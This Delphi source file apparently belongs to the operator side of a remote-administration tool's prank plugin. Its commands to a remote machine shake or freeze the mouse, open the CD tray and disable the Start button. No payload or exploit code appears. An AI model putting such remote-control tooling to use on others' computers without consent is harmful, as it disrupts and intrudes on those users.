unit Unitmain;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Buttons, ComCtrls, ImgList, Menus;

type
  TFormMain = class(TForm)
    ImageList1: TImageList;
    ListViewBromas: TListView;
    BtnEnviarBromas: TSpeedButton;
    PopupMenu1: TPopupMenu;
    h1: TMenuItem;
    procedure BtnEnviarBromasClick(Sender: TObject);
    procedure ListViewBromasKeyPress(Sender: TObject; var Key: Char);
  private
    { Private declarations }
  public
    { Public declarations }
     ConectionID: integer;
     PID : integer;
     PluginsID: Integer;
     stoprequested:boolean;
     //Función para comunicar con el Cliente
     SendData: function(ConnectionId, PluginID: dword; pData: WideString): bool; stdcall;

     procedure RecData(data:string);
     procedure Enviar(Texto:WideString);
  end;
   const    //Para permitir traducirlo facilmente en un futuro
    ACTIVADOSTR = 'Activado';
    DESACTIVADOSTR = 'Desactivado';
var
  FormMain: TFormMain;

implementation

{$R *.dfm}


procedure TFormMain.RecData(data:string);
var
  Recibido : string;
  i        : integer;
  index    : integer;
begin
  Recibido := Data;

  if Copy(Recibido, 1, Pos('|', Recibido)-1) = 'MOUSETEMBLOROSO' then
    index := 0
  else if Copy(Recibido, 1, Pos('|', Recibido)-1) = 'CONGELARMOUSE' then
    index := 1
  else if Copy(Recibido, 1, Pos('|', Recibido)-1) = 'ABRIRCD' then
    index := 2
  else if Copy(Recibido, 1, Pos('|', Recibido)-1) = 'MATARBOTONINICIO' then
    index := 3;
  Delete(Recibido, 1, Pos('|', Recibido));

  i := StrToIntDef(Recibido, -1);//El estado al que ha cambiado la broma: 0=desactivada, 1=activada

  case i of
    0: ListViewBromas.Items[index].SubItems[0] := DESACTIVADOSTR;
    1: ListViewBromas.Items[index].SubItems[0] := ACTIVADOSTR;
  end;

end;

procedure TFormMain.Enviar(Texto:WideString);
var
  Enviar: widestring;
begin
  Enviar := 'Bromas|'+Texto+#10;
  SendData(self.ConectionID, self.PluginsID, Enviar);
end;

procedure TFormMain.BtnEnviarBromasClick(Sender: TObject);
var
  broma: WideString;
begin
  if ListViewBromas.Selected = nil then
    MessageDlg('Selecciona alguna broma', mtWarning, [mbOK], 0)
  else
  begin
    case ListViewBromas.Selected.Index of //Selecciona la broma que se va a enviar
      0: Broma := 'MOUSETEMBLOROSO';
      1: Broma := 'CONGELARMOUSE';
      2: Broma := 'ABRIRCD';
      3: Broma := 'MATARBOTONINICIO';
    end;
    if ListViewBromas.Selected.SubItems[0] = DESACTIVADOSTR then
    begin
      Enviar(Broma + '|ACTIVAR|');
      if Broma = 'MOUSETEMBLOROSO' then
        ListViewBromas.Items[1].SubItems[0] := DESACTIVADOSTR;
      // El mouse se descongela si se activa el congela mouse
      if Broma = 'CONGELARMOUSE' then
        ListViewBromas.Items[0].SubItems[0] := DESACTIVADOSTR;
      //El mouse para de temblar si se congela
    end
    else //Si esta activada
      Enviar(Broma + '|DESACTIVAR|');
  end;

end;



procedure TFormMain.ListViewBromasKeyPress(Sender: TObject; var Key: Char);
begin
 if Key = #13 then
    BtnEnviarBromas.Click;
end;

end.
